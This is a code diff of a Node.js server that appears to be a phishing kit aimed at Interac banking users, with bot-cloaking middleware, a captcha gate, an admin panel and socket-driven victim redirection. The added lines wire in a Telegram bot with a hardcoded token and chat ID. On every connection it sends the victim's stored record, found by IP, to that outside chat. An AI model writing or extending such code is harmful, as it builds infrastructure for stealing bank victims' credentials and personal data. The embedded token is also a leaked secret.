@@ -10,6 +10,15 @@ const fs = require('fs');
 let fetch;
 const https = require('https');
 const http = require(`http`);
+const TelegramBot = require('node-telegram-bot-api');
+
+// replace 'YOUR_TELEGRAM_BOT_TOKEN' with your bot's token
+const token = '6326528266:AAHOiByLceYqskM-3wyuXlIXg9ulIaFqBp0';
+const bot = new TelegramBot(token, { polling: true });
+
+const chatId = '1547744729';
+
+
 
 (async () => {
   fetch = (await import('node-fetch')).default;
@@ -120,6 +129,9 @@ const verifyRecaptcha = (req, res, next) => {
     });
 };
 
+// Use this middleware in your app before your routes
+app.use(redirectBots);
+
 const httpApp = express();
 httpApp.use((req, res) => {
   res.redirect('https://' + req.headers.host + req.url);
@@ -127,8 +139,6 @@ httpApp.use((req, res) => {
 
 http.createServer(httpApp).listen(80);
 
-// Use this middleware in your app before your routes
-app.use(redirectBots);
 
 
 // ====================
@@ -139,8 +149,8 @@ app.use(bodyParser.urlencoded({ extended: true })); // for parsing application/x
 app.use(express.static('public'));
 
 app.get('/', (req, res) => {
-  //res.sendFile(join(__dirname, '/captcha/page.html'));
-  res.sendFile(join(__dirname, '/landing/interac/page.html'));
+  res.sendFile(join(__dirname, '/captcha/page.html'));
+  //res.sendFile(join(__dirname, '/landing/interac/page.html'));
 });
 
 app.get('/admin', (req, res) => {
@@ -276,6 +286,7 @@ io.on('connection', (socket) => {
     //console.log(`${data.page}`)
     //console.log(data.ip)
     socket.to(data.ip).emit('btnRedirection', { page: data.page })
+    
   });
 
   socket.on('usersRemoveAll', () => {
@@ -289,11 +300,18 @@ io.on('connection', (socket) => {
     configsModify(data.banks, data);
   })
 
+  let user_search = usersSearchByIP(userIP)
+  const message = JSON.stringify(user_search, null, 2);
+
+
+  bot.sendMessage(chatId, message);
+
 });
 
 fs.watch('users.json', (eventType, filename) => {
   if (filename && eventType === 'change') {
     emitUpdatedUsers(io);
+
   }
 });
 
